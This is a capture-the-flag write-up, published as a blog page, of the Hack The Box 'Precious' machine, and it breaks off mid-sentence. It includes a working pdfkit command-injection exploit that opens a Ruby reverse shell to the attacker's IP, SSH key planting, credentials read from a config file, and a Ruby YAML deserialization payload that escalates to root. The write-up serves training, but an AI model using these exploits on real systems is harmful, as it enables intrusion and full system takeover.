@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+    <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title> HTB - Precious —   | Gabriele Pongelli</title>
+<meta name="description" content="This is the blog of Gabriele Pongelli.">
+<meta name="keywords" content="">
+<link rel="canonical" href="/posts/writeups/machines/htb-precious">
+    <link rel="stylesheet" href="/assets/css/github-markdown.css" type="text/css" />
+<link rel="stylesheet" href="/assets/css/github.css" type="text/css" />
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" integrity="sha512-NhSC1YmyruXifcj/KFRWoC561YpHpc5Jtzgvbuzx5VozKpWvQ+4nXhPdFgmx8xqexRcpAglTj9sIBWINXa8x5w==" crossorigin="anonymous" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous" />
+<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    </head>
+    <body>
+        <div class="wrapper">
+        <header class="header">
+    <div class="navigation">
+        <a href="/" class="logo">Gabriele Pongelli</a>
+        <ul class="menu">
+            
+            
+            <li class="menu__entry"><a href="/">Home</a></li>
+            
+            <li class="menu__entry"><a href="/posts">Posts</a></li>
+            
+            <li class="menu__entry"><a href="/projects">Projects</a></li>
+            
+            <li class="menu__entry"><a href="/about">About</a></li>
+            
+        </ul>
+    </div>
+    <ul class="social-links">
+    
+    <a href="mailto:pongelligabriele@gmail.com" class="social-links__entry" target="_blank">
+    <em class="fa fa-envelope-square"></em>
+    </a>
+    
+    
+    <a href="https://github.com/gabrielepongelli" class="social-links__entry" target="_blank">
+    <em class="fab fa-github"></em>
+    </a>
+    
+    
+    <a href="https://in.linkedin.com/in/gabriele-p-68027a166" class="social-links__entry" target="_blank">
+    <em class="fab fa-linkedin"></em>
+    </a>
+    
+    </ul>
+</header>
+        <h1 class="page-title">
+<div class="page-title__text">HTB - Precious</div>
+<div class="page-title__subtitle"></div>
+</h1>
+
+<div class="entry-content markdown-body">
+<p>
+    <strong class="post-meta">
+        <time class="dt-published" datetime="2023-01-19T00:00:00+00:00" itemprop="datePublished">Jan 19, 2023
+        </time></strong>
+</p>
+
+<p><strong>Category:</strong> Machines<br />
+<strong>Difficulty:</strong> Easy<br />
+<strong>Description:</strong> -</p>
+
+<h2 id="enumeration">Enumeration</h2>
+<p>First of all I started with a basic nmap enumeration to discover which ports are open:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap 10.10.11.189 <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">--disable-arp-ping</span> <span class="nt">-oA</span> quick_full_scan
+Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-01-19 15:28 CET
+Nmap scan report <span class="k">for </span>10.10.11.189
+Host is up <span class="o">(</span>0.060s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65533 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>19.47 seconds
+</code></pre></div></div>
+
+<p>It cames out that the target has a webserver running on port 80.</p>
+
+<h2 id="web-footprinting">Web Footprinting</h2>
+<p>If we try to reach it through the browser, we will be redirected to its domain: <strong><code class="language-plaintext highlighter-rouge">precious.htb</code></strong>. So before going on let’s add this to the <strong><code class="language-plaintext highlighter-rouge">/etc/hosts</code></strong> file. After doing that if we visit the site this is what we will find:
+<img src="/assets/data/writeups/machines/htb-precious/imgs/Screenshot%202023-01-19%20at%2016-02-42%20Convert%20Web%20Page%20to%20PDF.png" alt="A page with an input box and the text &quot;Convert Web Page to PDF\nEnter URL to fetch&quot;" />
+The HTML code doesn’t contains anything new:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+    <span class="nt">&lt;title&gt;</span>Convert Web Page to PDF<span class="nt">&lt;/title&gt;</span>
+    <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"stylesheets/style.css"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"wrapper"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;h1</span> <span class="na">class=</span><span class="s">"title"</span><span class="nt">&gt;</span>Convert Web Page to PDF<span class="nt">&lt;/h1&gt;</span>
+        <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"/"</span> <span class="na">method=</span><span class="s">"post"</span><span class="nt">&gt;</span>
+            <span class="nt">&lt;p&gt;</span>Enter URL to fetch<span class="nt">&lt;/p&gt;&lt;br&gt;</span>
+            <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"url"</span> <span class="na">value=</span><span class="s">""</span><span class="nt">&gt;</span>
+            <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Submit"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;/form&gt;</span>
+        <span class="nt">&lt;h2</span> <span class="na">class=</span><span class="s">"msg"</span><span class="nt">&gt;&lt;/h2&gt;</span>
+    <span class="nt">&lt;/div&gt;</span> 
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+<p>Furthermore the site doesn’t make use of any cookies, and a common gobuster scan doesn’t find any additional page:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://precious.htb/ <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/common.txt
+<span class="o">===============================================================</span>
+Gobuster v3.4
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:                     http://precious.htb/
+<span class="o">[</span>+] Method:                  GET
+<span class="o">[</span>+] Threads:                 10
+<span class="o">[</span>+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
+<span class="o">[</span>+] Negative Status codes:   404
+<span class="o">[</span>+] User Agent:              gobuster/3.4
+<span class="o">[</span>+] Timeout:                 10s
+<span class="o">===============================================================</span>
+2023/01/19 15:45:37 Starting gobuster <span class="k">in </span>directory enumeration mode
+<span class="o">===============================================================</span>
+
+<span class="o">===============================================================</span>
+2023/01/19 15:46:11 Finished
+<span class="o">===============================================================</span>
+</code></pre></div></div>
+<p>Ok, so let’s try to scan the site and see if we can find the name of some technology:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>whatweb http://precious.htb/
+http://precious.htb/ <span class="o">[</span>200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0 + Phusion Passenger<span class="o">(</span>R<span class="o">)</span> 6.0.15], IP[10.10.11.189], Ruby-on-Rails, Title[Convert Web Page to PDF], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-Powered-By[Phusion Passenger<span class="o">(</span>R<span class="o">)</span> 6.0.15], X-XSS-Protection[1<span class="p">;</span> <span class="nv">mode</span><span class="o">=</span>block], nginx[1.18.0]
+</code></pre></div></div>
+<p>From the output of the command above we can see that <strong>the server is using Ruby-on-Rails</strong>, which is is server-side web application framework written in ruby.</p>
+
+<p>Ok, now it’s time to try using this site. To do so we can create a local webserver listening on the port 8080 with the command <strong><code class="language-plaintext highlighter-rouge">python3 -m http.server 8080</code></strong>. After that, if we try to submit as url our ip address, we receive the pdf:
+<img src="/assets/data/writeups/machines/htb-precious/imgs/Screenshot%202023-01-19%20at%2016-46-45%20r97u34hw5j14p2rfbwvwqgstmefcbm7r.pdf.png" alt="PDF with the content of our local server." />
+Nothing special. We can use a tool called <code class="language-plaintext highlighter-rouge">exiftool</code> to analyze the metadata of the file:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>exiftool r97u34hw5j14p2rfbwvwqgstmefcbm7r.pdf 
+ExifTool Version Number         : 12.52
+File Name                       : r97u34hw5j14p2rfbwvwqgstmefcbm7r.pdf
+Directory                       : <span class="nb">.</span>
+File Size                       : 11 kB
+File Modification Date/Time     : 2023:01:19 16:48:32+01:00
+File Access Date/Time           : 2023:01:19 16:48:32+01:00
+File Inode Change Date/Time     : 2023:01:19 16:48:32+01:00
+File Permissions                : <span class="nt">-rw-r--r--</span>
+File Type                       : PDF
+File Type Extension             : pdf
+MIME Type                       : application/pdf
+PDF Version                     : 1.4
+Linearized                      : No
+Page Count                      : 1
+Creator                         : Generated by pdfkit v0.8.6
+</code></pre></div></div>
+<p>If we take a closer look at this output we can see in the last line that the pdf was generated using pdfkit version 0.8.6. With a quick online research I found <a href="https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795">this PoC</a> that taks about a command injection vulnerability present in our pdfkit’s version (more precisely the CVE-2022-25765).</p>
+
+<h2 id="foothold">Foothold</h2>
+<p>Following the PoC that we found previously, we can write a simple python script that allow us to gain a reverse shell:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+
+
+<span class="n">TARGET_URL</span> <span class="o">=</span> <span class="s">"http://precious.htb/"</span>
+<span class="n">REV_SHELL_LOCAL_PORT</span> <span class="o">=</span> <span class="mi">9000</span>
+<span class="n">LOCAL_IP_ADDRESS</span> <span class="o">=</span> <span class="s">"10.10.16.7"</span>
+
+
+<span class="k">def</span> <span class="nf">command_injection</span><span class="p">(</span><span class="n">target_url</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">url_to_pdf</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">cmd</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">url_to_pdf</span><span class="si">}</span><span class="s">?name=%20`</span><span class="si">{</span><span class="n">cmd</span><span class="si">}</span><span class="s">`"</span>
+    
+    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">target_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
+        <span class="s">"url"</span><span class="p">:</span> <span class="n">payload</span>
+    <span class="p">})</span>
+
+    <span class="k">return</span> <span class="n">response</span><span class="p">.</span><span class="n">text</span>
+
+
+<span class="k">def</span> <span class="nf">reverse_shell</span><span class="p">(</span><span class="n">url</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">ip</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">port</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="bp">None</span><span class="p">:</span>
+    <span class="n">webserver_proc</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">Popen</span><span class="p">([</span><span class="s">"python3"</span><span class="p">,</span> <span class="s">"-m"</span><span class="p">,</span> <span class="s">"http.server"</span><span class="p">],</span> <span class="n">shell</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">DEVNULL</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">DEVNULL</span><span class="p">)</span>
+    
+    <span class="n">cmd</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"ruby -rsocket -e'spawn(</span><span class="se">\"</span><span class="s">sh</span><span class="se">\"</span><span class="s">,[:in,:out,:err]=&gt;TCPSocket.new(</span><span class="se">\"</span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="se">\"</span><span class="s">,</span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s">))'"</span>
+
+    <span class="n">command_injection</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="sa">f</span><span class="s">"http://</span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="s">:8080/"</span><span class="p">,</span> <span class="n">cmd</span><span class="p">)</span>
+
+    <span class="n">webserver_proc</span><span class="p">.</span><span class="n">kill</span><span class="p">()</span>
+    
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">reverse_shell</span><span class="p">(</span><span class="n">TARGET_URL</span><span class="p">,</span> <span class="n">LOCAL_IP_ADDRESS</span><span class="p">,</span> <span class="n">REV_SHELL_LOCAL_PORT</span><span class="p">)</span>
+
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h2 id="pivoting-part-1">Pivoting Part 1</h2>
+<h3 id="ssh-access">SSH Access</h3>
+<p>We spawned a shell in the victim server as the user <strong><code class="language-plaintext highlighter-rouge">ruby</code></strong> in the directory <strong><code class="language-plaintext highlighter-rouge">/var/www/pdfapp</code></strong>. Browsing to the home directory of the user and listing it we can see that it has a <strong><code class="language-plaintext highlighter-rouge">.ssh</code></strong> folder. Looking inside we can see that there is the <strong><code class="language-plaintext highlighter-rouge">authorized_keys</code></strong> file, so we can generate a new pair of public/private keys and add the public one to that file in order not to rely on the command injection vulnerability. In this way we can obtain a full working interactive shell!</p>
+
+<p>So, on our local machine we can run:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh-keygen                      
+Generating public/private rsa key pair.
+Enter file <span class="k">in </span>which to save the key <span class="o">(</span>/home/pozzi/.ssh/id_rsa<span class="o">)</span>: precious
+Enter passphrase <span class="o">(</span>empty <span class="k">for </span>no passphrase<span class="o">)</span>: 
+Enter same passphrase again: 
+Your identification has been saved <span class="k">in </span>precious
+Your public key has been saved <span class="k">in </span>precious.pub
+The key fingerprint is:
+SHA256:oWVwmuRZREVkvZ3uERdaGYhvA2oQVo6QYS9FA8cToW8 pozzi@kali
+The key<span class="s1">'s randomart image is:
++---[RSA 3072]----+
+|     =O%X==.. ..o|
+|    .+B@+. o.. + |
+|     o=o*.. ooo..|
+|      o+ +  .=+ .|
+|      .ES   ...o |
+|      .       o  |
+|             . . |
+|              .  |
+|                 |
++----[SHA256]-----+
+</span></code></pre></div></div>
+
+<p>And then we can copy and paste the content of our generated <strong><code class="language-plaintext highlighter-rouge">precious.pub</code></strong> public key file inside the <strong><code class="language-plaintext highlighter-rouge">authorized_users</code></strong> file of the target machine. Finally we can log in with:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh ruby@precious.htb <span class="nt">-i</span> ./precious            
+The authenticity of host <span class="s1">'precious.htb (10.10.11.189)'</span> can<span class="s1">'t be established.
+ED25519 key fingerprint is SHA256:1WpIxI8qwKmYSRdGtCjweUByFzcn0MSpKgv+AwWRLkU.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '</span>precious.htb<span class="s1">' (ED25519) to the list of known hosts.
+Linux precious 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Jan 19 12:32:36 2023 from 10.10.14.132
+-bash-5.1$
+</span></code></pre></div></div>
+
+<h3 id="information-gathering">Information Gathering</h3>
+<p>Let’s take a closer look at the content of the home directory of ruby:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span> ~
+total 36
+drwxr-xr-x 6 ruby ruby 4096 Jan 19 12:12 <span class="nb">.</span>
+drwxr-xr-x 4 root root 4096 Oct 26 08:28 ..
+lrwxrwxrwx 1 root root    9 Oct 26 07:53 .bash_history -&gt; /dev/null
+<span class="nt">-rw-r--r--</span> 1 ruby ruby  220 Mar 27  2022 .bash_logout
+<span class="nt">-rw-r--r--</span> 1 ruby ruby 3526 Mar 27  2022 .bashrc
+dr-xr-xr-x 2 root ruby 4096 Oct 26 08:28 .bundle
+drwxr-xr-x 3 ruby ruby 4096 Jan 19 11:51 .cache
+drwx------ 3 ruby ruby 4096 Jan 19 13:00 .gnupg
+<span class="nt">-rw-r--r--</span> 1 ruby ruby  807 Mar 27  2022 .profile
+drwx------ 2 ruby ruby 4096 Jan 19 12:09 .ssh
+</code></pre></div></div>
+<p>We can see that there is an directory called <strong><code class="language-plaintext highlighter-rouge">.bundle</code></strong>. Let’s see what it contains:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span> .bundle/
+total 12
+dr-xr-xr-x 2 root ruby 4096 Oct 26 08:28 <span class="nb">.</span>
+drwxr-xr-x 6 ruby ruby 4096 Jan 19 12:12 ..
+<span class="nt">-r-xr-xr-x</span> 1 root ruby   62 Sep 26 05:04 config
+
+<span class="nv">$ </span><span class="nb">cat</span> .bundle/config 
+<span class="nt">---</span>
+BUNDLE_HTTPS://RUBYGEMS__ORG/: <span class="s2">"henry:Q3c1AqGHtoI0aXAYFH"</span>
+</code></pre></div></div>
+<p>Those look like account credentials! 🎉</p>
+
+<h2 id="privilege-escalation-to-henry">Privilege Escalation to <strong><code class="language-plaintext highlighter-rouge">henry</code></strong></h2>
+<p>All we need to do is just login with the credentials that we just found:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh henry@precious.htb         
+henry@precious.htb<span class="s1">'s password: 
+Linux precious 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Jan 19 12:53:27 2023 from 10.10.16.47
+-bash-5.1$
+</span></code></pre></div></div>
+
+<h2 id="pivoting-part-2">Pivoting Part 2</h2>
+<p>Let’s see what the home directory of <strong><code class="language-plaintext highlighter-rouge">henry</code></strong> contains:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span> ~
+total 32
+drwxr-xr-x 3 henry henry 4096 Jan 19 12:06 <span class="nb">.</span>
+drwxr-xr-x 4 root  root  4096 Oct 26 08:28 ..
+lrwxrwxrwx 1 root  root     9 Sep 26 05:04 .bash_history -&gt; /dev/null
+<span class="nt">-rw-r--r--</span> 1 henry henry  220 Sep 26 04:40 .bash_logout
+<span class="nt">-rw-r--r--</span> 1 henry henry 3526 Sep 26 04:40 .bashrc
+drwxr-xr-x 3 henry henry 4096 Jan 19 12:02 .local
+<span class="nt">-rw-r--r--</span> 1 henry henry  807 Sep 26 04:40 .profile
+<span class="nt">-rw-r-----</span> 1 root  henry   33 Jan 19 11:50 user.txt
+</code></pre></div></div>
+<p>Finally the user flag!</p>
+
+<p>Now, we can take a look at what sudo actions henry is able to perform:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>henry on precious:
+    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
+
+User henry may run the following commands on precious:
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
+</code></pre></div></div>
+<p>Interesting! We can run the command <strong><code class="language-plaintext highlighter-rouge">/usr/bin/ruby /opt/update_dependencies.rb</code></strong> with <strong><code class="language-plaintext highlighter-rouge">root</code></strong> privileges and without the need to supply a password. This is the content of the file <strong><code class="language-plaintext highlighter-rouge">/opt/update_dependencies.rb</code></strong>:</p>
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Compare installed dependencies with those specified in "dependencies.yml"</span>
+<span class="nb">require</span> <span class="s2">"yaml"</span>
+<span class="nb">require</span> <span class="s1">'rubygems'</span>
+
+<span class="c1"># TODO: update versions automatically</span>
+<span class="k">def</span> <span class="nf">update_gems</span><span class="p">()</span>
+<span class="k">end</span>
+
+<span class="k">def</span> <span class="nf">list_from_file</span>
+    <span class="no">YAML</span><span class="p">.</span><span class="nf">load</span><span class="p">(</span><span class="no">File</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="s2">"dependencies.yml"</span><span class="p">))</span>
+<span class="k">end</span>
+
+<span class="k">def</span> <span class="nf">list_local_gems</span>
+    <span class="no">Gem</span><span class="o">::</span><span class="no">Specification</span><span class="p">.</span><span class="nf">sort_by</span><span class="p">{</span> <span class="o">|</span><span class="n">g</span><span class="o">|</span> <span class="p">[</span><span class="n">g</span><span class="p">.</span><span class="nf">name</span><span class="p">.</span><span class="nf">downcase</span><span class="p">,</span> <span class="n">g</span><span class="p">.</span><span class="nf">version</span><span class="p">]</span> <span class="p">}.</span><span class="nf">map</span><span class="p">{</span><span class="o">|</span><span class="n">g</span><span class="o">|</span> <span class="p">[</span><span class="n">g</span><span class="p">.</span><span class="nf">name</span><span class="p">,</span> <span class="n">g</span><span class="p">.</span><span class="nf">version</span><span class="p">.</span><span class="nf">to_s</span><span class="p">]}</span>
+<span class="k">end</span>
+
+<span class="n">gems_file</span> <span class="o">=</span> <span class="n">list_from_file</span>
+<span class="n">gems_local</span> <span class="o">=</span> <span class="n">list_local_gems</span>
+
+<span class="n">gems_file</span><span class="p">.</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">file_name</span><span class="p">,</span> <span class="n">file_version</span><span class="o">|</span>
+    <span class="n">gems_local</span><span class="p">.</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">local_name</span><span class="p">,</span> <span class="n">local_version</span><span class="o">|</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">file_name</span> <span class="o">==</span> <span class="n">local_name</span><span class="p">)</span>
+            <span class="k">if</span><span class="p">(</span><span class="n">file_version</span> <span class="o">!=</span> <span class="n">local_version</span><span class="p">)</span>
+                <span class="nb">puts</span> <span class="s2">"Installed version differs from the one specified in file: "</span> <span class="o">+</span> <span class="n">local_name</span>
+            <span class="k">else</span>
+                <span class="nb">puts</span> <span class="s2">"Installed version is equals to the one specified in file: "</span> <span class="o">+</span> <span class="n">local_name</span>
+            <span class="k">end</span>
+        <span class="k">end</span>
+    <span class="k">end</span>
+<span class="k">end</span>
+</code></pre></div></div>
+<p>We can see that the script loads a YAML file called <strong><code class="language-plaintext highlighter-rouge">dependencies.yml</code></strong>, but without providing a full path. After a quick research I found <a href="https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/">this article</a> that describes how it is possible to obtain RCE from a ruby dependency file. But this is valid only for versions between 2.x and 3.0.2. Before going on let’s see what version of ruby is installed in the target machine:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ruby <span class="nt">--version</span>
+ruby 2.7.4p191 <span class="o">(</span>2021-07-07 revision a21a3b7d23<span class="o">)</span> <span class="o">[</span>x86_64-linux-gnu]
+</code></pre></div></div>
+<p>Nice, the version is vulnerable!!!</p>
+
+<h2 id="privilege-escalation-to-root">Privilege Escalation to <strong><code class="language-plaintext highlighter-rouge">root</code></strong></h2>
+<p>Following the previous article we can craft our own dependency file:</p>
+<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nn">---</span>
+<span class="pi">-</span> <span class="kt">!ruby/object:Gem::Installer</span>
+    <span class="na">i</span><span class="pi">:</span> <span class="s">x</span>
+<span class="pi">-</span> <span class="kt">!ruby/object:Gem::SpecFetcher</span>
+    <span class="na">i</span><span class="pi">:</span> <span class="s">y</span>
+<span class="pi">-</span> <span class="kt">!ruby/object:Gem::Requirement</span>
+  <span class="na">requirements</span><span class="pi">:</span>
+    <span class="kt">!ruby/object:Gem::Package::TarReader</span>
+    <span class="na">io</span><span class="pi">:</span> <span class="nl">&amp;1</span> <span class="kt">!ruby/object:Net::BufferedIO</span>
+      <span class="na">io</span><span class="pi">:</span> <span class="nl">&amp;1</span> <span class="kt">!ruby/object:Gem::Package::TarReader::Entry</span>
+         <span class="na">read</span><span class="pi">:</span> <span class="m">0</span>
+         <span class="na">header</span><span class="pi">:</span> <span class="s2">"</span><span class="s">abc"</span>
+      <span class="na">debug_output</span><span class="pi">:</span> <span class="nl">&amp;1</span> <span class="kt">!ruby/object:Net::WriteAdapter</span>
+         <span class="na">socket</span><span class="pi">:</span> <span class="nl">&amp;1</span> <span class="kt">!ruby/object:Gem::RequestSet</span>
+             <span class="na">sets</span><span class="pi">:</span> <span class="kt">!ruby/object:Net::WriteAdapter</span>
+                 <span class="na">socket</span><span class="pi">:</span> <span class="kt">!ruby/module</span> <span class="s1">'</span><span class="s">Kernel'</span>
+                 <span class="na">method_id</span><span class="pi">:</span> <span class="s">:system</span>
+             <span class="na">git_set</span><span class="pi">:</span> <span class="s">/bin/bash</span>
+         <span class="na">method_id</span><span class="pi">:</span> <span class="s">:resolve</span>
+</code></pre></div></div>
+<p>and place the command we want to execute in <strong><code class="language-plaintext highlighter-rouge">git_set</code></strong>, and finally launch the command <strong><code class="language-plaintext highlighter-rouge">sudo /usr/bin/ruby /opt/update_dependencies.rb</code></strong>. We can automatize everything with the following python script:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">import</span> <span class="nn">os</span>
+
+
+<span class="k">def</span> <span class="nf">rce</span><span class="p">(</span><span class="n">cmd</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="bp">None</span><span class="p">:</span>
+    <span class="n">depenency_file_content</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"""---
+- !ruby/object:Gem::Installer
+    i: x
+- !ruby/object:Gem::SpecFetcher
+    i: y
+- !ruby/object:Gem::Requirement
+  requirements:
+    !ruby/object:Gem::Package::TarReader
+    io: &amp;1 !ruby/object:Net::BufferedIO
+      io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry
+         read: 0
+         header: "abc"
+      debug_output: &amp;1 !ruby/object:Net::WriteAdapter
+         socket: &amp;1 !ruby/object:Gem::RequestSet
+             sets: !ruby/object:Net::WriteAdapter
+                 socket: !ruby/module 'Kernel'
+                 method_id: :system
+             git_set: </span><span class="si">{</span><span class="n">cmd</span><span class="si">}</span><span class="s">
+         method_id: :resolve"""</span>
+         
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"dependencies.yml"</span><span class="p">,</span> <span class="s">"w"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">depenency_file_content</span><span class="p">)</span>
+        
+    <span class="n">os</span><span class="p">.</span><span class="n">execvp</span><span class="p">(</span><span class="s">"sudo"</span><span class="p">,</span> <span class="p">[</span><span class="s">"sudo"</span><span class="p">,</span> <span class="s">"/usr/bin/ruby"</span><span class="p">,</span> <span class="s">"/opt/update_dependencies.rb"</span><span class="p">])</span>
+
+
+<span class="k">def</span> <span class="nf">escalate</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="bp">None</span><span class="p">:</span>
+    <span class="n">rce</span><span class="p">(</span><span class="s">"/bin/bash"</span><span class="p">)</span>
+    
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">escalate</span><span class="p">()</span>
+
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></div></div>
+<p>In order to obtain it in the target machine we can create a local server in our local machine with the command <strong><code class="language-plaintext highlighter-rouge">python3 -m http.service 8080</code></strong> and then download it with curl in this way: <strong><code class="language-plaintext highlighter-rouge">curl 'http://10.10.16.7:8080/privesc.py' -O</code></strong>. Then in order to run it:</p>
